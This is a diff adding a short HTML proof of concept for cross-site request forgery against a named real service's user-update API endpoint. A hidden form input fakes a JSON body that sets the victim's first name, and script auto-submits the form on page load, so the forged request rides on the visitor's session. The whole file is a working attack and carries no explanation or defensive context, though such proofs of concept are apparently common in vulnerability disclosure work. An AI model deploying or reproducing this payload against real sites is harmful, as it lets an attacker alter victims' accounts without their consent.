@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form action="https://api.qwilr.com/api/users/update" method="POST">
+    <!-- Forge JSON-like payload using hidden inputs -->
+    <input type="hidden" name='{"firstName":"boko","lastName":""}' value="" />
+  </form>
+  <script>
+    document.forms[0].submit(); // Auto-submit
+  </script>
+</body>
+</html>
